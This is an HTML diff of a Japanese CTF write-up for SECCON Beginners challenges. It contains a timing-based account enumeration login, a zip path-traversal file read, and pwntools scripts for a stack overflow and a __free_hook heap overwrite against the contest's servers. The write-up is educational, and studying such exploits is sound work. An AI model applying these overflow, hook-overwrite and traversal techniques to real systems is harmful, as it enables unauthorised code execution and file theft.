+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Please login.&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
     
-    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">POST</span><span style="color:#e6db74">&#34;</span>:
-        name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">name</span><span style="color:#e6db74">&#34;</span>]
-        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">password</span><span style="color:#e6db74">&#34;</span>]
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+        name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;name&#34;</span>]
+        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;password&#34;</span>]
 
         exists, account <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>get_account(name)
 
         <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> exists:
-            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index.html</span><span style="color:#e6db74">&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Login failed, try again.</span><span style="color:#e6db74">&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:.7f}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login failed, try again.&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
 
         <span style="color:#75715e"># auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.</span>
         <span style="color:#75715e"># You know, it&#39;s really secure... isn&#39;t it? :-)</span>
         hashed_password <span style="color:#f92672">=</span> auth<span style="color:#f92672">.</span>calc_password_hash(app<span style="color:#f92672">.</span>SALT, password)
         <span style="color:#66d9ef">if</span> hashed_password <span style="color:#f92672">!=</span> account<span style="color:#f92672">.</span>password:
-            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index.html</span><span style="color:#e6db74">&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Login failed, try again.</span><span style="color:#e6db74">&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:.7f}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login failed, try again.&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
 
-        session[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">name</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">=</span> name
-        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">dashboard.html</span><span style="color:#e6db74">&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:.7f}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+        session[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">=</span> name
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;dashboard.html&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
 
 <span style="color:#75715e"># ====================</span>
 
-<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/challenge</span><span style="color:#e6db74">&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">GET</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">POST</span><span style="color:#e6db74">&#34;</span>])
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/challenge&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">challenge</span>():
     t <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>perf_counter()
     
-    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">GET</span><span style="color:#e6db74">&#34;</span>:
-        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">challenge.html</span><span style="color:#e6db74">&#34;</span>, employees<span style="color:#f92672">=</span>employees, sec<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:.7f}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;challenge.html&#34;</span>, employees<span style="color:#f92672">=</span>employees, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
 
-    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">POST</span><span style="color:#e6db74">&#34;</span>:
-        answer <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>getlist(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">answer</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+        answer <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>getlist(<span style="color:#e6db74">&#34;answer&#34;</span>)
 
         <span style="color:#75715e"># If you can enumerate all accounts, I&#39;ll give you FLAG!</span>
         <span style="color:#66d9ef">if</span> set(answer) <span style="color:#f92672">==</span> set(account<span style="color:#f92672">.</span>name <span style="color:#66d9ef">for</span> account <span style="color:#f92672">in</span> db<span style="color:#f92672">.</span>get_all_accounts()):
             message <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>FLAG
         <span style="color:#66d9ef">else</span>:
-            message <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Wrong!!</span><span style="color:#e6db74">&#34;</span>
+            message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Wrong!!&#34;</span>
         
-        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">challenge.html</span><span style="color:#e6db74">&#34;</span>, message<span style="color:#f92672">=</span>message, employees<span style="color:#f92672">=</span>employees, sec<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:.7f}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;challenge.html&#34;</span>, message<span style="color:#f92672">=</span>message, employees<span style="color:#f92672">=</span>employees, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
 
 <span style="color:#75715e"># ====================</span>
 
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#39;</span>:
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
     db<span style="color:#f92672">.</span>init()
-    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">CTF4B_HOST</span><span style="color:#e6db74">&#34;</span>), port<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">CTF4B_PORT</span><span style="color:#e6db74">&#34;</span>))
+    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_HOST&#34;</span>), port<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_PORT&#34;</span>))
 </code></pre></div><p>気になるコメントが書かれています。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> exists:
-            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index.html</span><span style="color:#e6db74">&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Login failed, try again.</span><span style="color:#e6db74">&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:.7f}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login failed, try again.&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{:.7f}&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
         <span style="color:#75715e"># auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.</span>
         <span style="color:#75715e"># You know, it&#39;s really secure... isn&#39;t it? :-)</span>
 </code></pre></div><p>たくさんストレッチングをおこなっているようです。
@@ -816,7 +816,7 @@ employees <span style="color:#f92672">=</span> db<span style="color:#f92672">.</
 <p>アップロードサービスを悪用して，このフラグを閲覧できないでしょうか？</p>
 <p>ソースコードの以下の部分に<code>echo file_get_contents($filepath);</code>という記述があります。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">// return file if filename parameter is passed
-if (isset($_GET[&#34;filename&#34;]) <span style="color:#960050;background-color:#1e0010">&amp;</span><span style="color:#960050;background-color:#1e0010">&amp;</span> is_string(($_GET[&#34;filename&#34;]))) {
+if (isset($_GET[&#34;filename&#34;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> is_string(($_GET[&#34;filename&#34;]))) {
     if (in_array($_GET[&#34;filename&#34;], $_SESSION[&#34;files&#34;], TRUE)) {
         $filepath = $user_dir . &#34;/&#34; . $_GET[&#34;filename&#34;];
         header(&#34;Content-Type: text/plain&#34;);
@@ -865,12 +865,12 @@ kali@kali:~/ctf/ctf4b-2020/web/unzip/test/test/test$ zip hoge.zip ../../flag.txt
 </code></pre></div><p>ソースコード</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bs.quals.beginners.seccon.jp</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">9001</span>)
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;bs.quals.beginners.seccon.jp&#39;</span>, <span style="color:#ae81ff">9001</span>)
 
 ret <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x00400626</span>
 win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400861</span>
 
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(win)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(win)
 
 io<span style="color:#f92672">.</span>sendline(payload)
 io<span style="color:#f92672">.</span>interactive()
@@ -941,26 +941,26 @@ ctf4b<span style="color:#f92672">{</span>u_r_st4ck_pwn_b3g1nn3r_tada<span style=
 <code>interactive()</code>を挟んで手動で操作をおこないました。</p>
 <p>ヒントを見て値を調節しての繰り返しで解いたので，最適解では無いです。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-io <span style="color:#f92672">=</span>remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bh.quals.beginners.seccon.jp</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">9002</span>)
+io <span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;bh.quals.beginners.seccon.jp&#39;</span>, <span style="color:#ae81ff">9002</span>)
 free_hook <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x7f925332a8e8</span>)
 win <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x556ec09d2465</span>)
-io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">hook&gt;: </span><span style="color:#e6db74">&#39;</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hook&gt;: &#39;</span>)
 free_hook <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
 free_hook <span style="color:#f92672">=</span> int(free_hook<span style="color:#f92672">.</span>decode()[<span style="color:#ae81ff">2</span>:],<span style="color:#ae81ff">16</span>)
-io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">win&gt;: </span><span style="color:#e6db74">&#39;</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;win&gt;: &#39;</span>)
 win <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
 win <span style="color:#f92672">=</span> int(win<span style="color:#f92672">.</span>decode()[<span style="color:#ae81ff">2</span>:],<span style="color:#ae81ff">16</span>)
 <span style="color:#66d9ef">print</span>(free_hook,win)
 
-io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
-io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
 <span style="color:#75715e">#ここでfreeをおこなう。終わったらctrl+cで処理を進めること</span>
 io<span style="color:#f92672">.</span>interactive()
-io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
-io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x110</span>) <span style="color:#f92672">+</span> p64(free_hook))
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x110</span>) <span style="color:#f92672">+</span> p64(free_hook))
 <span style="color:#75715e"># ここでBをmallocしてすぐfreeにする。</span>
 io<span style="color:#f92672">.</span>interactive()
-io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
 io<span style="color:#f92672">.</span>sendline(p64(win))
 <span style="color:#75715e">#最後にfreeをする。</span>
 io<span style="color:#f92672">.</span>interactive()
